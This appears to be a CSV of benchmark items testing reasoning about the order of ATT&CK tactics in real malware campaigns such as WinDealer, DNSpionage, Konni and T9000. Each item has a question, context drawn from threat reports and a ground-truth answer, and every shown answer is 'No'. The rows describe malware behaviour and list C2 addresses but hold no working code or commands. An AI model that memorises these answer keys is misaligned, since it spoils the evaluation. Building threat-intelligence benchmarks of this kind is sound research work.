Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth
1426,341,1924-Execution-T1559.002-Dynamic Data Exchange,"After achieving initial access by placing spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launching sysCrt32.exe, is it likely that the spyware will use Windows DDE for execution of commands and a malicious VBS before establishing persistence by ensuring the WindowsApps folder is added to the %PATH% environment variable?","Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",No
303,72,72-Command and Control-T1071-Application Layer Protocol,"After the malware collected data such as keystrokes, clipboard content, and account information from various sources on the victim's device, is it likely that it exfiltrated the collected information through HTTP GET posts and email messages before establishing communication with a command center at the IP address 192.169.82.86?","Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.","Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.
Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.
Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.
Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",No
811,209,209-Collection-T1025-Data from Removable Media,"After exfiltrating the processed and encrypted data to the C2 server, is it likely that WinDealer collected data from removable media and targeted relevant folders only after discovering information about the infected PC and network configuration and staging encrypted stolen data in the %TEMP% folder?","Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",No
1185,288,288-Execution-T1559-Inter-Process Communication,"After initiating cleanup procedures designed for defense evasion if it encounters communication failures, is Tildeb likely to inject code into a Microsoft Exchange Server process only before using command-line arguments to establish communication with its C&C server?","Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.","Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Command and Control: Tildeb establishes network communication with its C&C server over TCP, using either ingress or egress connections. It employs the MFC Classes CAsyncSocket and CSocket for network communications and does not use SMTP despite the default port number assignment. The implant sets up a secure communication channel with the server, where all subsequent traffic is encrypted. It uses a modified SHA-1 hashing algorithm to generate pseudorandom data for establishing session keys, which are then used for XOR-encrypted communication.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",No
689,176,176-Defense Evasion-T1197-BITS Jobs,"After attackers gain initial access to hosts by identifying internal systems and remote control software through tools such as Advanced IP Scanner and PushVNC package, is it likely that they will use AutoExe1.bat to download malware via BITS jobs only before identifying internal systems and remote control software?","Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.","Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.
Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",No
1620,384,2292-Discovery-T1069.002-Domain Groups,"After DNSpionage malware decodes a PE file encoded with base64 and executes it as a scheduled task as part of its execution phase, is it likely that it will enumerate domain groups using AdFind to understand the environment during the discovery phase?","Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",No
1530,366,2130-Persistence-T1547.006-Kernel Modules and Extensions,"After 'stopedge.bat' manages the deletion of files such as 'versioninfo.bat' and 'update.vbs' as a means of defense evasion, is it likely that persistence will be established by using kernel modules such as in the techniques employed by Drovorub or Skidmap?",Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.,"Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",No
1175,285,285-Initial Access-T1566-Phishing,"After enticing recipients through spear-phishing emails under the Reconnaissance tactic, is it likely that the Taidoor malware will execute beaconing communications using a consistent HTTP GET request pattern before exploiting a vulnerability in Microsoft Office to drop itself onto the target's system?","Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",No
420,103,35-Execution-T1059.001-PowerShell,"After using an email attachment and social engineering to prompt the target to execute a .src file for initial access, is it likely that the operator will utilize a PowerShell script such as TANKTRAP to spread and launch a wiper before achieving persistence by creating a Windows shortcut in the startup folder?",Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.,"Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",No
975,241,241-Initial Access-T1566-Phishing,Are Ukrainian and Polish state organizations and businesses likely to be targeted with BlackEnergy spear-phishing emails related to the current Ukrainian crisis only after the malware executes techniques for bypassing UAC and defeating the signed driver requirement for Defense Evasion?,Initial Access: A large number of state organizations and businesses from various industry fields in the Ukraine and Poland have been targeted in recent attacks. The most effective infection vectors appear to be spear-phishing emails with subjects related to the current Ukrainian crisis combined with the exploitation of MS Office documents. CVE-2014-1761 was also used to spread BlackEnergy.,"Defense Evasion: BlackEnergy is a trojan which has undergone significant functional changes since it was first publicly analyzed by Arbor Networks in 2007. It has evolved from a relatively simple DDoS trojan into a sophisticated piece of modern malware with a modular architecture. The malware includes techniques for bypassing UAC, defeating the signed driver requirement in Windows, and a selection of BlackEnergy2 plug-ins used for parasitic file infections, network discovery, remote code execution, and data collection.
Others: The most recent campaigns leveraging BlackEnergy are dated August 2014. The malware has been used for sending spam, online bank fraud, and targeted attacks. BlackEnergy version 2, which featured rootkit techniques, was documented by SecureWorks in 2010. The targeted attacks recently discovered are proof that the trojan is still active. The technical analysis of the BlackEnergy family focuses on novel functionality and the differences introduced by new 'lite' variants. The many targets in the Ukraine and Poland have been infected through several known and unknown infection vectors.",No
1656,391,2362-Execution-T1053.003-Cron,"After the FHAPPI campaign delivered an APT phishing email containing a link to malware hosted on a Geocities website and the VBScript downloaded and opened a .doc file leading to its execution, is it likely that the malware will install itself as a cron job using the cron utility instead of using PowerShell for further execution?","Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",No
1218,303,1594-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After T9000 steals sensitive data from Skype communications and removable drives during the collection phase, is it likely that the malware will exfiltrate collected data from the infected machine to the C2 using the MIME protocol?","Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",No
1160,282,1414-Initial Access-T1566.004-Spearphishing Voice,"Before CrateDepression drops Poseidon payloads via a malicious crate named 'rustdecimal,' is it likely that adversaries would impersonate legitimate IT personnel in phone calls to direct victims to download a remote monitoring tool for gaining initial access?","Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.","Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.
Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",No
